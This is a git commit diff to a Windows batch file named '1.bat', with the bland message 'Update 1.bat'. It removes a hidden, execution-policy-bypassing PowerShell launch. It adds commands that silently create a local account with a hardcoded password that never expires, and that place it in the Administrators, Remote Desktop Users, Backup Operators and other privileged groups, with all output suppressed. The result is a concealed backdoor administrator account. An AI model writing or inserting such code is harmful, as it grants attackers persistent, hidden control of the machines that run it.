3da52cb009f3d90117170ee597fd006615d335c4
anti-box <bclee6c@daum.net>
2026-02-10 15:46:18 +0700

    Update 1.bat

--- 1.bat
+++ 1.bat
@@ -1,5 +1,10 @@
-mode 15,1
 @echo off
-powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File "C:\mng-kybooksch\1.ps1" -exit
+net user $admin admin123!@# /add /fullname:"$admin" /expires:never /passwordchg:yes >nul 2>&1
 
+net localgroup "Users" $admin /add >nul 2>&1
 
+net localgroup "Administrators" $admin /add >nul 2>&1
+net localgroup "Remote Desktop Users" $admin /add >nul 2>&1
+net localgroup "Power Users" $admin /add >nul 2>&1
+net localgroup "Backup Operators" $admin /add >nul 2>&1
+net localgroup "Performance Log Users" $admin /add >nul 2>&1
